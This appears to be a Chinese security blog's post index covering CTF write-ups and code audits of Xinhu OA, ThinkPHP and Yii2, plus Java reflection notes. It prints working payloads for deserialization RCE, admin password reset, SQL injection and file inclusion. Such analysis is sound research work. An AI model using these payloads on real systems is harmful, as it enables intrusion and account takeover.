args： 用于方法的调用，是一个object的数组，参数有可能是多个 但需要注意的是，invoke方法第一个参数并不是固定的： 如果调用这个方法是普通方法，第一个参数就是类对象； 如果调用这个方法是静态方法，第一个参数就是类； 通过一个例子去理解 import java.lang.reflect.InvocationTargetException; import java.lang.reflect.Method; public class Invoke { public static void main(String[] args) throws ClassNotFoundException, InstantiationException, IllegalAccessException, NoSuchMethodException, InvocationTargetException { Class c = Class.forName(\"Invoke\"); Object o = c.newInstance(); Method m = c.getMethod(\"test\"); m.invoke(o); } public void test(){ System.out.println(\"测试成功\"); } } 简单来说就是这样 方法.invoke(类或类对象) 先forName拿到Class，再newInstance获取类对象，再getMethod获取方法，然后调用 ","date":"2022-03-07","objectID":"/java%E5%AE%89%E5%85%A8_%E5%8F%8D%E5%B0%84/:2:5","tags":null,"title":"[Java安全]反射","uri":"/java%E5%AE%89%E5%85%A8_%E5%8F%8D%E5%B0%84/"},{"categories":["Java"],"content":"Runtime的rce例子（访问限制突破） Runtime类里面有一个exec方法，可以执行命令 import java.lang.reflect.InvocationTargetException; import java.lang.reflect.Method; public class Exec { public static void main(String[] args) throws ClassNotFoundException, InstantiationException, IllegalAccessException, NoSuchMethodException, InvocationTargetException { Class c = Class.forName(\"java.lang.Runtime\"); Object o = c.newInstance(); Method m = c.getMethod(\"exec\",String.class); m.invoke(o,\"/System/Applications/Calculator.app/Contents/MacOS/Calculator\"); } } 但是发现报错了 出现这个问题的原因： 使用的类没有无参构造函数 使用的类构造函数是私有的 那么解决方案就是setAccessible(true);，用这个去突破访问限制 Java.lang.reflect.AccessibleObject类是Field，Method和Constructor类对象的基类，可以提供将反射对象标记为使用它抑制摸人Java访问控制检查的功能，同时上述的反射类中的Field，Method和Constructor继承自AccessibleObject。所以我们在这些类方法基础上调用setAccessible()方法，既可对这些私有字段进行操作 简单来说，私有的属性、方法、构造方法，可以通过这个去突破限制，xxx.setAccessible(true) 可以看到Runtime的构造方法是private的 那么这里我们就可以这么去突破限制 先获取构造方法，然后setAccessible获取访问权限 然后再最后invoke里面，第一个参数写成con.newInstance() import java.lang.reflect.Constructor; import java.lang.reflect.InvocationTargetException; import java.lang.reflect.Method; public class Exec { public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException, InstantiationException { Class c = Class.forName(\"java.lang.Runtime\"); Constructor con = c.getDeclaredConstructor(); con.setAccessible(true); Method m = c.getMethod(\"exec\",String.class); m.invoke(con.newInstance(),\"/System/Applications/Calculator.app/Contents/MacOS/Calculator\"); } } 这里有一个疑问，如果把con.newInstance单独提取出来，他打开计算器不会显示出来，但是后台的确是启动了，不知道啥原因 import java.lang.reflect.Constructor; import java.lang.reflect.InvocationTargetException; import java.lang.reflect.Method; public class Exec { public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException, InstantiationException { Class c = Class.forName(\"java.lang.Runtime\"); Constructor con = c.getDeclaredConstructor(); con.setAccessible(true); Object o = con.newInstance(); Method m = c.getMethod(\"exec\",String.class); m.invoke(o,\"/System/Applications/Calculator.app/Contents/MacOS/Calculator\"); } } ","date":"2022-03-07","objectID":"/java%E5%AE%89%E5%85%A8_%E5%8F%8D%E5%B0%84/:3:0","tags":null,"title":"[Java安全]反射","uri":"/java%E5%AE%89%E5%85%A8_%E5%8F%8D%E5%B0%84/"},{"categories":["Java"],"content":"后记 反射中常用的几个重要方法： 获取类的⽅法： forName 实例化类对象的⽅法： newInstance 获取函数的⽅法： getMethod 执⾏函数的⽅法： invoke 限制突破方法：setAccessible ","date":"2022-03-07","objectID":"/java%E5%AE%89%E5%85%A8_%E5%8F%8D%E5%B0%84/:4:0","tags":null,"title":"[Java安全]反射","uri":"/java%E5%AE%89%E5%85%A8_%E5%8F%8D%E5%B0%84/"},{"categories":["技术分享"],"content":"题目地址 SycloverTeam提供了题目的docker环境 https://github.com/SycloverTeam/SCTF2021/tree/master/web/Upload_it_1 wp 首先题目给了composer.json { \"name\": \"sctf2021/upload\", \"authors\": [ { \"name\": \"AFKL\", \"email\": \"upload@qq.com\" } ], \"require\": { \"symfony/string\": \"^5.3\", \"opis/closure\": \"^3.6\" } } 导入了两个包，那就肯定是组件相关的攻击了 \"symfony/string\": \"^5.3\", \"opis/closure\": \"^3.6\" composer update一下 第二个组件是关于闭包反序列化的，所以猜测和序列化有关 index.php内的主要逻辑代码 if (!empty($_POST['path'])) { $upload_file_path = $_SESSION[\"upload_path\"].\"/\".$_POST['path']; $upload_file = $upload_file_path.\"/\".$file['name']; } else { $upload_file_path = $_SESSION[\"upload_path\"]; $upload_file = $_SESSION[\"upload_path\"].\"/\".$file['name']; } if (move_uploaded_file($file['tmp_name'], $upload_file)) { echo \"OK! Your file saved in: \" . $upload_file; } else { echo \"emm...Upload failed:(\"; } } else { echo \"too big!!!\"; } 这里会调用$_SESSION[\"upload_path\"]，那么考虑到session反序列化 题目测试到，上传可以进行目录穿越，但是只有tmp目录可写 题目有给到phpinfo()，打开看一下，path没给，但是能操作的目录只有tmp，那么肯定就是/tmp/sess_xxxx了 那么我们就是可以操控session文件了，所以我们现在的目的就是怎么去构造一个session文件去rce 可以看到index.php里面session拼接了： $_SESSION[\"upload_path\"].\"/\".$_POST['path']; 所以如果 $_SESSION[\"upload_path\"]是一个对象的话，那就会触发一个__toString方法了 那么我们就去找一个可以利用的__toString方法，这里是可以利用的在LazyString这里找到利用的方法 再看到这个组件，opis/closure，可序列化闭包，那么我们就可以通过创建一个攻击性的闭包去反序列化，这样完成我们的攻击 那么如此，我们就可以构造我们的exp了 \u003c?php namespace Symfony\\Component\\String { class LazyString { private $value; public function __construct($a){ $this-\u003evalue = $a; } } } namespace { include_once \"../vendor/autoload.php\"; $func = function() {system(\"cat /flag\");}; $raw = \\Opis\\Closure\\serialize($func); $data = unserialize($raw); $exp = new \\Symfony\\Component\\String\\LazyString($data); echo urlencode(serialize($exp)); } payload，注意%00的解码，前面拼接上upload_path| upload_path|O:35:\"Symfony\\Component\\String\\LazyString\":1:{s:42:\"%00Symfony\\Component\\String\\LazyString%00value\";C:32:\"Opis\\Closure\\SerializableClosure\":157:{a:5:{s:3:\"use\";a:0:{}s:8:\"function\";s:34:\"function() {\\system(\"cat /flag\");}\";s:5:\"scope\";N;s:4:\"this\";N;s:4:\"self\";s:32:\"0000000045e636f7000000007352e912\";}}} 再次上传文件，利用session去拼接调用__toString方法，成功rce 预期解 看了作者给的wp，发现预期解是通过__sleep方法去调用__toString方法的 而php原生的session执行反序列化的时候，的确会调用__sleep方法 思路 这道题的整个的思路就是： 首先测试到上传的文件可以进行目录穿越，但是只有tmp目录有权限 源码中观察到闭包反序列化组件，方向可能是反序列化，执行composer update安装源码 有session的使用，可以上传文件到tmp，而且有session的使用，而且phpinfo中有写是file，所以考虑到是session反序列化 构造闭包去序列化打rce ","date":"2022-02-13","objectID":"/sctf2021/:0:0","tags":null,"title":"[SCTF2021]Upload_it_1复现闭包组件反序列化rce","uri":"/sctf2021/"},{"categories":["技术分享"],"content":"前言 对于这个OA的代码审计是在最近的西湖论剑比赛中出的一个web题，题目是2.3.1版本的信呼OA，在当时是最新版的（2021.11.20） 这次比赛结束打算好好审计一波 环境搭建 此次代码审计我用的是2.3.1版本 项目地址： https://xinhu-1251238447.file.myqcloud.com/file/xinhu_utf8_v2.3.1.zip 安装好后，修改admin的密码，成功初始化 漏洞分析 ","date":"2021-11-30","objectID":"/%E4%BF%A1%E5%91%BCoa2.3.1%E7%89%88%E6%9C%AC%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/:0:0","tags":null,"title":"[代码审计]信呼OA2.3.1版本代码审计","uri":"/%E4%BF%A1%E5%91%BCoa2.3.1%E7%89%88%E6%9C%AC%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"},{"categories":["技术分享"],"content":"修改任意用户密码 在安装完该OA系统后，我修改了默认密码为1234qwer 漏洞存在于webmain/task/api/reimplatAction.php中 看到这里的代码 public function indexAction() { $body = $this-\u003egetpostdata(); if(!$body)return; $db = m('reimplat:dept'); $key = $db-\u003egethkey(); $bodystr = $this-\u003ejm-\u003estrunlook($body, $key); if(!$bodystr)return; $data = json_decode($bodystr, true); $msgtype = arrvalue($data,'msgtype'); $msgevent= arrvalue($data,'msgevent'); ============中间省略================================ //修改密码 if($msgtype=='editpass'){ $user = arrvalue($data, 'user'); $pass = arrvalue($data, 'pass'); if($pass \u0026\u0026 $user){ $where = \"`user`='$user'\"; $mima = md5($pass); m('admin')-\u003eupdate(\"`pass`='$mima',`editpass`=`editpass`+1\", $where); } } } 首先是getpostdata()方法获取post传入的数据 第二个点就是key，我们跟进这个getkey()方法 在webmain/model/reimplat/reimplat.php中可以看到如下代码，会返回md5值 默认安装完系统这个是空的 返回的也就是空string的md5值，即d41d8cd98f00b204e9800998ecf8427e public function gethkey() { $key = $this-\u003ereimplat_huitoken; if(isempt($key))$key = $this-\u003ereimplat_secret; if(isempt($key))$key = $this-\u003ereimplat_cnum; return md5($key); } 然后就是$bodystr = $this-\u003ejm-\u003estrunlook($body, $key);，这里对我们传入的数据进行解密 那么我们可以在下面构造一个加密，获取到修改后的sign，如下图所示 $test = $this-\u003ejm-\u003estrlook(json_encode(array(\"msgtype\"=\u003e\"editpass\",\"user\"=\u003e\"admin\",\"pass\"=\u003e\"123456\")), $key); echo $test; 发包时还是得用post方法发包，成功拿到恶意修改的sign 此时我们再把这个sign作为post数据穿进去，经过getpostdata()获取到data，再通过相同的key去通过strunlook()进行解密，从而进入判断条件 修改密码 $msgtype=='editpass' 发包如下 密码成功修改成了123456 ","date":"2021-11-30","objectID":"/%E4%BF%A1%E5%91%BCoa2.3.1%E7%89%88%E6%9C%AC%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/:1:0","tags":null,"title":"[代码审计]信呼OA2.3.1版本代码审计","uri":"/%E4%BF%A1%E5%91%BCoa2.3.1%E7%89%88%E6%9C%AC%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"},{"categories":["技术分享"],"content":"文件上传处sql盲注 需要先登录后台才能使用文件上传 webmain/public/upload/uploadAction.php 在upfileAjax方法里面，找到执行sql语句处，跟进uploadback方法 这里有一个过滤函数，跟进看一下 这里注释说明了是过滤特殊的文件名，可以看到，这里过滤的很少 修改uptype为*，文件名为sql注入语句，可以看到成功延时 盲注语句可以这样写，这里单独的()会被过滤掉，双写就可以了 1' and if(ascii(substr((select database(())),1,1))\u003e1,SLEEP(3),0)-- - 这样就可以写脚本跑内容了，这里就不多说了 ","date":"2021-11-30","objectID":"/%E4%BF%A1%E5%91%BCoa2.3.1%E7%89%88%E6%9C%AC%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/:2:0","tags":null,"title":"[代码审计]信呼OA2.3.1版本代码审计","uri":"/%E4%BF%A1%E5%91%BCoa2.3.1%E7%89%88%E6%9C%AC%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"},{"categories":["技术分享"],"content":"未授权备份 在webmain/task/runt/sysAction.php中 这里用beifenClassModel调用了他的start方法 找到beifenClassModel，看到里面的start方法 会把数据库数据备份到upload/data目录下，以时间命名 payload： /task.php?m=sys|runt\u0026a=beifen 可以发现已经备份过来了 都是可以直接访问的，可以爆破一下文件名去拿 这里是可以拿到管理员密码的 这个的前提是知道数据库的库名，不然还是打不了了，默认是xinhu ","date":"2021-11-30","objectID":"/%E4%BF%A1%E5%91%BCoa2.3.1%E7%89%88%E6%9C%AC%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/:3:0","tags":null,"title":"[代码审计]信呼OA2.3.1版本代码审计","uri":"/%E4%BF%A1%E5%91%BCoa2.3.1%E7%89%88%E6%9C%AC%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"},{"categories":["技术分享"],"content":"前言 漏洞存在版本，分为两大版本： ThinkPHP 5.0-5.0.24 ThinkPHP 5.1.0-5.1.30 环境搭建 composer create-project topthink/think=5.0.5 thinkphp5.0.5 --prefer-dist 修改composer.json \"require\": { \"php\": \"\u003e=5.4.0\", \"topthink/framework\": \"5.0.5\" }, 执行composer update 漏洞分析 payload: _method=__construct\u0026method=get\u0026filter[]=system\u0026get[]=whoami 在thinkphp/library/think/Request.php中的method方法里面 public function method($method = false) { if (true === $method) { // 获取原始请求类型 return IS_CLI ? 'GET' : (isset($this-\u003eserver['REQUEST_METHOD']) ? $this-\u003eserver['REQUEST_METHOD'] : $_SERVER['REQUEST_METHOD']); } elseif (!$this-\u003emethod) { if (isset($_POST[Config::get('var_method')])) { $this-\u003emethod = strtoupper($_POST[Config::get('var_method')]); $this-\u003e{$this-\u003emethod}($_POST); } elseif (isset($_SERVER['HTTP_X_HTTP_METHOD_OVERRIDE'])) { $this-\u003emethod = strtoupper($_SERVER['HTTP_X_HTTP_METHOD_OVERRIDE']); } else { $this-\u003emethod = IS_CLI ? 'GET' : (isset($this-\u003eserver['REQUEST_METHOD']) ? $this-\u003eserver['REQUEST_METHOD'] : $_SERVER['REQUEST_METHOD']); } } return $this-\u003emethod; } 看这里的判断，跟进一下config的get方法 if (isset($_POST[Config::get('var_method')])) { $this-\u003emethod = strtoupper($_POST[Config::get('var_method')]); $this-\u003e{$this-\u003emethod}($_POST); 他执行了Config::get('var_method')，把参数var_method给传进去 public static function get($name = null, $range = '') { $range = $range ?: self::$range; // 无参数时获取所有 if (empty($name) \u0026\u0026 isset(self::$config[$range])) { return self::$config[$range]; } if (!strpos($name, '.')) { $name = strtolower($name); return isset(self::$config[$range][$name]) ? self::$config[$range][$name] : null; } else { // 二维数组设置和获取支持 $name = explode('.', $name); $name[0] = strtolower($name[0]); return isset(self::$config[$range][$name[0]][$name[1]]) ? self::$config[$range][$name[0]][$name[1]] : null; } } 返回了一个$config[$range][$name]，即config[_sys_][var_method]，他的值就是_method 所以当我们传入_method=xxx的时候，就可以控制这个$this-\u003e{$this-\u003emethod}($_POST);，从而去执行想要执行的函数 if (isset($_POST[Config::get('var_method')])) { $this-\u003emethod = strtoupper($_POST[Config::get('var_method')]); $this-\u003e{$this-\u003emethod}($_POST); 再看这个类的__construct方法 这个循环会造成一个变量覆盖，而且还是循环的覆盖，可以覆盖很多的值 清楚了漏洞存在的根本原因，接下来我们直接从入口开始分析，public/index.php 再跟进start.php 调用了一个App的run方法 再跟进这个方法，这里检测路由会调用routeCheck方法 // 获取应用调度信息 $dispatch = self::$dispatch; if (empty($dispatch)) { // 进行URL路由检测 $dispatch = self::routeCheck($request, $config); } // 记录当前调度信息 $request-\u003edispatch($dispatch); routeCheck里面调用了Route的check方法 再跟进看到这里调用到了request的method方法 之后就是接上前面分析的request类，传参数_method=__construct进入request类的__construct方法 开始变量的覆盖 filter[]=system get[]=whoami method=GET 再回到check方法，返回return $this-\u003emethod;，由于我们传的参数有一个是method=get，所以变量覆盖后，返回的就是get 如果不做这一步（method=get）返回的就是一些乱七八糟，后续中就可能会出错 再走出去回到app类的run()方法 判断debug，进入分支内，可以看到有一个$request-\u003eparam() 这里vars会被赋值成我们post的数据 这里会执行一个array_merge，合并一下url和post中的参数 先进去get方法，因为我们已经通过变量覆盖为get赋值了，所以不会进入判断条件 再进入input方法，第一个参数传的是$this-\u003eget，这个参数是被我们变量覆盖成whoami的 进去后直接就返回了whoami 出来后param变成了这样，param[0]=whoami 再走到input方法，把param传进去，形参是data 这里再进入filterValue方法，参数继续传下去，data和filter 到这里value就是data，即whoami filter就是filters遍历出来的，之前遍历覆盖成了system 这样就成功的执行了system(“whoami”) 总结 不得不佩服大佬的能力，这个rce分析下来个人感觉还是很复杂的，每一个点都被巧妙的利用起来了，太强了太强了orz 画一张图总结一下这里的利用链吧 ","date":"2021-11-26","objectID":"/thinkphp5.0.x%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96%E5%AF%BC%E8%87%B4%E7%9A%84rce%E5%88%86%E6%9E%90/:0:0","tags":null,"title":"[代码审计]ThinkPHP 5.0.x 变量覆盖导致的RCE分析","uri":"/thinkphp5.0.x%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96%E5%AF%BC%E8%87%B4%E7%9A%84rce%E5%88%86%E6%9E%90/"},{"categories":["技术分享"],"content":"前言 漏洞存在版本\u003c2.0.38 CVE-2020-15148 框架搭建 直接去github下载，修改好cookie的key，然后就可以访问/web了 漏洞分析 先看github里作者的提交 可以发现在 framework/db/BatchQueryResult.php 里面添加了_wakeup方法 我们就直奔这里去看了 yii2.0.37/vendor/yiisoft/yii2/db/BatchQueryResult.php 看到这里的__distruct()入口方法 会进去reset方法，但是进去可能就close了，但是这个_dataReader是可以控制的，到时候我们构造poc的时候可以添加析构方法为他赋值！这里$this-\u003e_dataReader就可以触发一个__call方法 全局搜一下__call方法，发现这个类里面有妙处 /vendor/fzaninotto/faker/src/Faker/Generator.php public function format($formatter, $arguments = array()) { return call_user_func_array($this-\u003egetFormatter($formatter), $arguments); } /** * @param string $formatter * * @return Callable */ public function getFormatter($formatter) { if (isset($this-\u003eformatters[$formatter])) { return $this-\u003eformtters[$formatter]; } foreach ($this-\u003eproviders as $provider) { if (method_exists($provider, $formatter)) { $this-\u003eformatters[$formatter] = array($provider, $formatter); return $this-\u003eformatters[$formatter]; } } throw new \\InvalidArgumentException(sprintf('Unknown formatter \"%s\"', $formatter)); } /** * @param string $method * @param array $attributes * * @return mixed */ public function __call($method, $attributes) { return $this-\u003eformat($method, $attributes); } 可以发现，__call进去，就直接进format了，而format里面就会直接执行call_user_func_array，跟进一下他的参数 先跟进一下getFormatter，发现这里返回的是formatters，这个参数是我们可控的！ 但是另一个$attributes就不可控了，这里是可以执行一些无参数的函数，但是如果只是调用php原生的那肯定做不了什么事情，我们需要调用yii框架里面自带的无参数方法看看有没有能进一步利用的 继续全局搜索，看看有没有那个无参数方法里面调用了call_user_func 这里是用的正则去搜索，这个正则折腾了好久 function \\w*\\(\\)\\n? *\\{(.*\\n)+ *call_user_func 大概意思就是 function 开头，接着是一段字符接上()后换行，并只匹配0或1次，这里就表示无参数的函数了，但是我们可以更狠一点，直接搜索无参数方法中有call_user_func的，那么就继续加上* \\{匹配前面的表达式0次或多次后加上大括号，然后在call_user_func前面多次匹配上一堆除了换行之外的字符后加上换行：(.*\\n)+ *，最后加上call_user_func 这样就很精准的匹配到无参数方法中有call_user_func函数的方法了 这里找到了一个，简直不要太好打 /vendor/yiisoft/yii2/rest/CreateAction.php public function run() { if ($this-\u003echeckAccess) { call_user_func($this-\u003echeckAccess, $this-\u003eid); } 此处省略 } checkAccess和id都是我们可控的！那么这条链子就打通了，我们构造一下poc POC1 \u003c?php namespace yii\\rest{ class CreateAction{ public $checkAccess; public $id; public function __construct(){ $this-\u003echeckAccess = 'system'; $this-\u003eid = 'whoami'; } } } namespace Faker{ use yii\\rest\\CreateAction; class Generator{ protected $formatters; public function __construct(){ $this-\u003eformatters[\"close\"] = [new CreateAction, 'run']; } } } namespace yii\\db{ use Faker\\Generator; class BatchQueryResult{ private $_dataReader; public function __construct(){ $this-\u003e_dataReader = new Generator; } } } namespace{ echo base64_encode(serialize(new yii\\db\\BatchQueryResult)); } ?\u003e payload: web?r=test/test\u0026data=TzoyMzoieWlpXGRiXEJhdGNoUXVlcnlSZXN1bHQiOjE6e3M6MzY6IgB5aWlcZGJcQmF0Y2hRdWVyeVJlc3VsdABfZGF0YVJlYWRlciI7TzoxNToiRmFrZXJcR2VuZXJhdG9yIjoxOntzOjEzOiIAKgBmb3JtYXR0ZXJzIjthOjE6e3M6NToiY2xvc2UiO2E6Mjp7aTowO086MjE6InlpaVxyZXN0XENyZWF0ZUFjdGlvbiI6Mjp7czoxMToiY2hlY2tBY2Nlc3MiO3M6Njoic3lzdGVtIjtzOjI6ImlkIjtzOjY6Indob2FtaSI7fWk6MTtzOjM6InJ1biI7fX19fQ== 成功rce 这条链子的总的攻击思路为 1. BatchQueryResult里面__destruct入口函数调用了reset()函数 2. reset()函数内：$this-\u003e_dataReader-\u003eclose();其中_dataReader可控 3. 触发__call方法，找到可利用的call方法：Generator，但是只能执行无参数函数 4. 寻找框架内的可利用的无参数函数，Generator的run 这条链子最后一个寻找无参数可利用函数的时候，还有一个可以利用 POC2 vendor/yiisoft/yii2/rest/IndexAction.php public function run() { if ($this-\u003echeckAccess) { call_user_func($this-\u003echeckAccess, $this-\u003eid); } return $this-\u003eprepareDataProvider(); } poc \u003c?php namespace yii\\rest{ class IndexAction{ public $checkAccess; public $id; public function __construct(){ $this-\u003echeckAccess = 'system'; $this-\u003eid = 'whoami'; } } } namespace Faker{ use yii\\rest\\IndexAction; class Generator{ protected $formatters; public function __construct(){ $this-\u003eformatters[\"close\"] = [new IndexAction, 'run']; } } } namespace yii\\db{ use Faker\\Generator; class BatchQueryResult{ private $_dataReader; public function __construct(){ $this-\u003e_dataReader = new Generator; } } } namespace{ echo base64_encode(serialize(new yii\\db\\BatchQueryResult)); } ?\u003e POC3 作者在2.0.38只修复了BatchQueryResult，那么我们能不能再找一个__destruct入口函数去调用call方法，接上后面的链子呢？ 全局搜索__dest","date":"2021-11-16","objectID":"/yii2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/:0:0","tags":null,"title":"[代码审计]Yii2反序列化漏洞分析 V2.0.38","uri":"/yii2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"},{"categories":["CTF"],"content":"漏洞影响范围 加载模版解析变量时存在变量覆盖问题，导致文件包含漏洞的产生 漏洞影响版本：5.0.0\u003c=ThinkPHP5\u003c=5.0.18 、5.1.0\u003c=ThinkPHP\u003c=5.1.10 tp框架搭建 tp框架由两部分组成 应用项目: https://github.com/top-think/think 核心框架: https://github.com/top-think/framework 框架下载好后，需要更名为thinkphp 这里可以直接用composer来获取代码 通过以下命令获取测试环境代码： composer create-project --prefer-dist topthink/think=5.0.18 tp5.0.18 将 composer.json 文件的 require 字段设置成如下： \"require\": { \"php\": \"\u003e=5.6.0\", \"topthink/framework\": \"5.0.18\" }, 然后执行 composer update ，并将 application/index/controller/Index.php 文件代码设置如下： \u003c?php namespace app\\index\\controller; use think\\Controller; class Index extends Controller { public function index() { $this-\u003eassign(request()-\u003eget()); return $this-\u003efetch(); // 当前模块/默认视图目录/当前控制器（小写）/当前操作（小写）.html } } 创建 application/index/view/index/index.html 文件 漏洞分析 payload： http://127.0.0.1/tp5.0.18/public/index?cacheFile=php://filter/read=convert.base64-encode/resource=/etc/passwd 打断点进行调试 先进入assign进行模板变量的赋值 这边会有一个过滤，看起来像sql的过滤，与我们这次的没啥关系 然后进入fetch方法，走完前面的缓存，就会进入一个read方法 这里进行了一个变量的赋值：extract($vars, EXTR_OVERWRITE);，但是这里他设置了一个属性：EXTR_OVERWRITE 这个属性的存在，会照成一个变量覆盖的效果 这时候，cacheFile就会变成我们get提交的数据 下一步就是直接包含了这个文件 输出读取的文件 成功的包含到了 漏洞总结 总体来说，漏洞的思路就是： 先通过view的assign把get数据存在数组data中 然后进入view的fetch方法，通过$vars = array_merge(self::$var, $this-\u003edata, $vars);，将data中的数据再合并到vars的变量中去 再进入了Think的fetch方法，vars变量被赋进去了 再到template的fetch方法中去，data变量依旧继续传递下去 到template的fetch方法里面，里面有一个cacheFile变量，值为箭头所指的文件，到了read方法，data和cacheFile一起被赋值进去 可以看到，这里的extract函数由于EXTR_OVERWRITE设置了参数，所以cacheFile变量被覆盖了，导致后面的include就包含了我们vars中的值，而这个值我们是可以控制的，这就造成了一个文件包含的漏洞 漏洞的修复 官方漏洞的修复方案 他这里是用了一个$this-\u003ecacheFile 这样一来，在include的时候就不会因为变量覆盖而包含到我们data中的数据了 public function read($cacheFile, $vars = []) { $this-\u003ecacheFile = $cacheFile; if (!empty($vars) \u0026\u0026 is_array($vars)) { // 模板阵列变量分解成为独立变量 extract($vars, EXTR_OVERWRITE); } //载入模版缓存文件 include $this-\u003ecacheFile; } 这里学长的文章 也是提到了为啥参数不换成EXTR_SKIP防止变量的覆盖呢，EXTR_SKIP的作用就是：如果有冲突，不覆盖已有的变量，那么这一步就会失效，万一你确实是想传这么一个$cacheFile=xxx，那么到这里就会直接实效掉，导致功能的损坏，所以利用$this-\u003ecacheFile是更优的选择 ","date":"2021-11-03","objectID":"/tp5%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/:0:0","tags":null,"title":"[代码审计]ThinkPHP5的文件包含漏洞","uri":"/tp5%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"},{"categories":["Java"],"content":"Jar包的调试 这里以冰蝎做示例 把冰蝎的jar包和他必须的db数据库文件放到项目的lib目录下 把jar包添加到库 如下配置调试配置 新建远程JVM调试 JVM的命令行参数，根据JDK的版本去选择 然后比如在这打一个断点 然后在jar包目录下执行如下命令，后面的参数是刚刚配置调试的那个配置 注意这里，suspend要改成y，不然会卡不住断点，这个参数的意思是：是否等待调试器的接入 回到idea，debug就可以卡住断点了 Weblogic的远程调试 这里我们是以dacker来配合Idea进行代码调试，使用的是vulhub项目 示例：CVE-2017-10271 在docker-compose.yml里面加上8453端口，这个端口是用于调试的 docker-compose up -d获取镜像并启动后，进入命令行，修改配置文件 在如下路径的setDomainEnv.sh文件中，找到JAVA_DEBUG这里，在下面追加如下代码 enbugFlag=\"true\" export debugFlag 然后执行docker restart xxx命令，重启容器 下一步我们需要把源代码提取到本地 我们需要/root/Oracle/Middleware/下的modules和wlserver_10.3文件 使用cp命令的缺点：操作一些长文件名的时候会报错 推荐使用zip压缩后，cp提取出压缩包 打开idea，将wlserver_10.3/server/lib添加为库 配置调试器，和上面的jar包一样，端口换成8453就行了 Tomcat的远程调试 以CVE-2017-12615漏洞环境示例 开启5005调试端口，我这里把8080换成了1002，防止端口冲突，本地还是开了挺多服务的 访问1002端口，成功部署 在catalina.sh里面插入如下代码 /usr/local/tomcat/bin/catalina.sh JAVA_OPTS=\"-agentlib:jdwp=transport=dt_socket,server=y,suspend=y,address=5005\" 然后重启docker 注意⚠️ ，这里不能直接拿vscode改，重启会报错找不到catalina.sh文件。。。踩坑找了好久才找到原因 用echo写进去就行，也不知道是为啥，希望有了解过的师傅解答一下 下一步就是导出docker里面的lib docker cp 79:/usr/local/tomcat/lib ./ 在idea，创建项目，把lib添加为库 配置调试器还是一样的，端口换成5005 成功卡住 ","date":"2021-09-18","objectID":"/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1_%E8%BF%9C%E7%A8%8B%E8%B0%83%E8%AF%95%E5%88%9D%E6%8E%A2/:0:0","tags":null,"title":"[Java安全] 远程调试初探","uri":"/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1_%E8%BF%9C%E7%A8%8B%E8%B0%83%E8%AF%95%E5%88%9D%E6%8E%A2/"},{"categories":["技术分享"],"content":"最近在一道题目 里面学到了一个新的小技巧 在php中，字符串是可以递增的，如下： 但是不可递减 这道题是这样的 \u003c?php error_reporting(0); if ($_GET['looklook']){ highlight_file(__FILE__); }else{ setcookie(\"hint\", \"?looklook\", time()+3600); } if (isset($_POST['ctf_show'])) { $ctfshow = $_POST['ctf_show']; if (is_string($ctfshow) || strlen($ctfshow) \u003c= 107) { if (!preg_match(\"/[!@#%^\u0026*:'\\\"|`a-zA-BD-Z~\\\\\\\\]|[4-9]/\",$ctfshow)){ eval($ctfshow); }else{ echo(\"fucccc hacker!!\"); } } } else { phpinfo(); } ?\u003e 可以看到，这里长度的限制是107，我们如果拼接一个_GET，如果硬从C开始自增，那可能会超过限制，T理C太远了，所以这里学到了两个新的操作 在这篇文章 有写到（也是原题） $_=C/C ---\u003e NAN $_=1/C ---\u003e INF 但是这不是string类型，但在php里面，我们可以通过拼接一个字符串来让他转成String类型 比如这里我写如下代码 \u003c?php $a = (C/C.C); $b = (1/C.C); var_dump($a); var_dump($b); 成功得到string类型，这里我们就使用索引就可以单选中字母了 这样做就可以从N开始递增了，避开了长度的限制 ","date":"2021-08-19","objectID":"/%E5%88%A9%E7%94%A8php%E7%9A%84nan%E5%92%8Cinf%E6%9D%A5%E8%8E%B7%E5%8F%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%9D%A5%E8%87%AA%E5%A2%9E%E7%BB%95%E8%BF%87%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B6/:0:0","tags":null,"title":"利用PHP的NAN和INF来获取字符串来自增绕过长度限制","uri":"/%E5%88%A9%E7%94%A8php%E7%9A%84nan%E5%92%8Cinf%E6%9D%A5%E8%8E%B7%E5%8F%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%9D%A5%E8%87%AA%E5%A2%9E%E7%BB%95%E8%BF%87%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B6/"},{"categories":null,"content":"关于我","date":"2019-08-02","objectID":"/about/","tags":null,"title":"关于我","uri":"/about/"},{"categories":null,"content":"Me: Hello, I am interested in CTF and Penetration A member of the 风信子 major in Web\u0026Misc Contact: Mail: echo MzM2NDc0NDM1NUBxcS5jb20= | base64 --decode ","date":"2019-08-02","objectID":"/about/:0:0","tags":null,"title":"关于我","uri":"/about/"}]